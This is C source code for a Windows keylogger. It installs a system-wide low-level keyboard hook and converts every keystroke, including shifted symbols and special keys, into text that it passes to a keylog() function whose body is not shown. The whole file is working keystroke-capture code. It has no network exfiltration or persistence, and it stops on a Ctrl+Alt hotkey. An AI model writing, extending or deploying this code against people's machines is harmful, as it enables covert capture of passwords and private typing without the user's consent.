#include "keylogger.h"
#include "main.h"

#define VK_VOLUME_MUTE 0xAD
#define VK_VOLUME_DOWN 0xAE
#define VK_VOLUME_UP 0xAF


KBDLLHOOKSTRUCT kbdStruct;

int isCapsLock()
{
	return (GetKeyState(VK_CAPITAL) & 0x0001);
}


void updateKeyState(BYTE* keystate, int keycode)
{
	keystate[keycode] = GetKeyState(keycode);
}


LRESULT CALLBACK hookCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
    KBDLLHOOKSTRUCT* pKeyBoard = (KBDLLHOOKSTRUCT*)lParam;
    char val[5];
    DWORD dwMsg = 1;
    switch (wParam)
    {

    case WM_KEYDOWN:
    {
        
        DWORD vkCode = pKeyBoard->vkCode;

        if ((vkCode >= 39) && (vkCode <= 64))
        {
           
            if (GetAsyncKeyState(VK_SHIFT)) 
            {
               
                switch (vkCode)
                    
                {
                case 0x30:
                    keylog(")");
                    break;
                case 0x31:
                    keylog("!");
                    break;
                case 0x32:
                    keylog("@");
                    break;
                case 0x33:
                    keylog("#");
                    break;
                case 0x34:
                    keylog("$");
                    break;
                case 0x35:
                    keylog("%");
                    break;
                case 0x36:
                    keylog("^");
                    break;
                case 0x37:
                    keylog("&");
                    break;
                case 0x38:
                    keylog("*");
                    break;
                case 0x39:
                    keylog("(");
                    break;
                }
            }
            else 
            {
                sprintf_s(val, "%c", vkCode);
                keylog(val);
            }
        }
        else if ((vkCode > 64) && (vkCode < 91)) 
        {
            if (!(GetAsyncKeyState(VK_SHIFT) ^ isCapsLock())) 
            {
                vkCode += 32; 
            }
            sprintf_s(val, "%c", vkCode);
            keylog(val);
        }
        else 
        {
            switch (vkCode)
            {
            case VK_CANCEL:
                keylog("[Cancel]");
                break;
            case VK_SPACE:
                keylog(" ");
                break;
            case VK_LCONTROL:
                keylog("[LCtrl]");
                break;
            case VK_RCONTROL:
                keylog("[RCtrl]");
                break;
            case VK_LMENU:
                keylog("[LAlt]");
                break;
            case VK_RMENU:
                keylog("[RAlt]");
                break;
            case VK_LWIN:
                keylog("[LWindows]");
                break;
            case VK_RWIN:
                keylog("[RWindows]");
                break;
            case VK_APPS:
                keylog("[Applications]");
                break;
            case VK_SNAPSHOT:
                keylog("[PrintScreen]");
                break;
            case VK_INSERT:
                keylog("[Insert]");
                break;
            case VK_PAUSE:
                keylog("[Pause]");
                break;
            case VK_VOLUME_MUTE:
                keylog("[VolumeMute]");
                break;
            case VK_VOLUME_DOWN:
                keylog("[VolumeDown]");
                break;
            case VK_VOLUME_UP:
                keylog("[VolumeUp]");
                break;
            case VK_SELECT:
                keylog("[Select]");
                break;
            case VK_HELP:
                keylog("[Help]");
                break;
            case VK_EXECUTE:
                keylog("[Execute]");
                break;
            case VK_DELETE:
                keylog("[Delete]");
                break;
            case VK_CLEAR:
                keylog("[Clear]");
                break;
            case VK_RETURN:
                keylog("[Enter]");
                break;
            case VK_BACK:
                keylog("[Backspace]");
                break;
            case VK_TAB:
                keylog("[Tab]");
                break;
            case VK_ESCAPE:
                keylog("[Escape]");
                break;
            case VK_LSHIFT:
                keylog("[LShift]");
                break;
            case VK_RSHIFT:
                keylog("[RShift]");
                break;
            case VK_CAPITAL:
                keylog("[CapsLock]");
                break;
            case VK_NUMLOCK:
                keylog("[NumLock]");
                break;
            case VK_SCROLL:
                keylog("[ScrollLock]");
                break;
            case VK_HOME:
                keylog("[Home]");
                break;
            case VK_END:
                keylog("[End]");
                break;
            case VK_PLAY:
                keylog("[Play]");
                break;
            case VK_ZOOM:
                keylog("[Zoom]");
                break;
            case VK_DIVIDE:
                keylog("[/]");
                break;
            case VK_MULTIPLY:
                keylog("[*]");
                break;
            case VK_SUBTRACT:
                keylog("[-]");
                break;
            case VK_ADD:
                keylog("[+]");
                break;
            case VK_PRIOR:
                keylog("[PageUp]");
                break;
            case VK_NEXT:
                keylog("[PageDown]");
                break;
            case VK_LEFT:
                keylog("[LArrow]");
                break;
            case VK_RIGHT:
                keylog("[RArrow]");
                break;
            case VK_UP:
                keylog("[UpArrow]");
                break;
            case VK_DOWN:
                keylog("[DownArrow]");
                break;
            case VK_NUMPAD0:
                keylog("[0]");
                break;
            case VK_NUMPAD1:
                keylog("[1]");
                break;
            case VK_NUMPAD2:
                keylog("[2]");
                break;
            case VK_NUMPAD3:
                keylog("[3]");
                break;
            case VK_NUMPAD4:
                keylog("[4]");
                break;
            case VK_NUMPAD5:
                keylog("[5]");
                break;
            case VK_NUMPAD6:
                keylog("[6]");
                break;
            case VK_NUMPAD7:
                keylog("[7]");
                break;
            case VK_NUMPAD8:
                keylog("[8]");
                break;
            case VK_NUMPAD9:
                keylog("[9]");
                break;
            case VK_F1:
                keylog("[F1]");
                break;
            case VK_F2:
                keylog("[F2]");
                break;
            case VK_F3:
                keylog("[F3]");
                break;
            case VK_F4:
                keylog("[F4]");
                break;
            case VK_F5:
                keylog("[F5]");
                break;
            case VK_F6:
                keylog("[F6]");
                break;
            case VK_F7:
                keylog("[F7]");
                break;
            case VK_F8:
                keylog("[F8]");
                break;
            case VK_F9:
                keylog("[F9]");
                break;
            case VK_F10:
                keylog("[F10]");
                break;
            case VK_F11:
                keylog("[F11]");
                break;
            case VK_F12:
                keylog("[F12]");
                break;
            case VK_F13:
                keylog("[F13]");
                break;
            case VK_F14:
                keylog("[F14]");
                break;
            case VK_F15:
                keylog("[F15]");
                break;
            case VK_F16:
                keylog("[F16]");
                break;
            case VK_F17:
                keylog("[F17]");
                break;
            case VK_F18:
                keylog("[F18]");
                break;
            case VK_F19:
                keylog("[F19]");
                break;
            case VK_F20:
                keylog("[F20]");
                break;
            case VK_F21:
                keylog("[F21]");
                break;
            case VK_F22:
                keylog("[F22]");
                break;
            case VK_F23:
                keylog("[F23]");
                break;
            case VK_F24:
                keylog("[F24]");
                break;
            case VK_OEM_2:
                if (GetAsyncKeyState(VK_SHIFT))
                    keylog("?");
                else
                    keylog("/");
                break;
            case VK_OEM_3:
                if (GetAsyncKeyState(VK_SHIFT))
                    keylog("~");
                else
                    keylog("`");
                break;
            case VK_OEM_4:
                if (GetAsyncKeyState(VK_SHIFT))
                    keylog("{");
                else
                    keylog("[");
                break;
            case VK_OEM_5:
                if (GetAsyncKeyState(VK_SHIFT))
                    keylog("|");
                else
                    keylog("\\");
                break;
            case VK_OEM_6:
                if (GetAsyncKeyState(VK_SHIFT))
                    keylog("}");
                else
                    keylog("]");
                break;
            case VK_OEM_7:
                if (GetAsyncKeyState(VK_SHIFT))
                    keylog("\\");
                else
                    keylog("'");
                break;
                break;
            case 0xBC:                
                if (GetAsyncKeyState(VK_SHIFT))
                    keylog("<");
                else
                    keylog(",");
                break;
            case 0xBE:              
                if (GetAsyncKeyState(VK_SHIFT))
                    keylog(">");
                else
                    keylog(".");
                break;
            case 0xBA:              
                if (GetAsyncKeyState(VK_SHIFT))
                    keylog(":");
                else
                    keylog(";");
                break;
            case 0xBD:              
                if (GetAsyncKeyState(VK_SHIFT))
                    keylog("_");
                else
                    keylog("-");
                break;
            case 0xBB:              
                if (GetAsyncKeyState(VK_SHIFT))
                    keylog("+");
                else
                    keylog("=");
                break;
            default:
                dwMsg += pKeyBoard->scanCode << 16;
                dwMsg += pKeyBoard->flags << 24;

                char key[16];              
                GetKeyNameText(dwMsg, key, 15);
                keylog(key);
            }
        }
        break;
    }
    default:     
        return CallNextHookEx(NULL, nCode, wParam, lParam);
    }
    return 0;
}

DWORD WINAPI loop(LPVOID lpParameter)
{
    HHOOK hookHandle;
    HINSTANCE handleInstance = GetModuleHandle(NULL);
    
    if (!handleInstance)
    {
        return 1;
    }
    else
    {
        hookHandle = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)hookCallback, handleInstance, 0);
      
        RegisterHotKey(NULL, 1, MOD_ALT | MOD_CONTROL, 0);

        MSG msg;

        while (GetMessage(&msg, NULL, 0, 0) != 0)
        {
          
            if (msg.message == WM_HOTKEY)
            {
                UnhookWindowsHookEx(hookHandle);
                return 0;
            }
         
            TranslateMessage(&msg);          
            DispatchMessage(&msg);
        }

        UnhookWindowsHookEx(hookHandle);
    }
    return 0;
}
int startThread(char* argv[])
{
    HANDLE hThread;
   

    hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)loop,
        (LPVOID)argv[0], 0, NULL);

    if (hThread)
    {       
        return WaitForSingleObject(hThread, INFINITE);
    }
    return 1;
}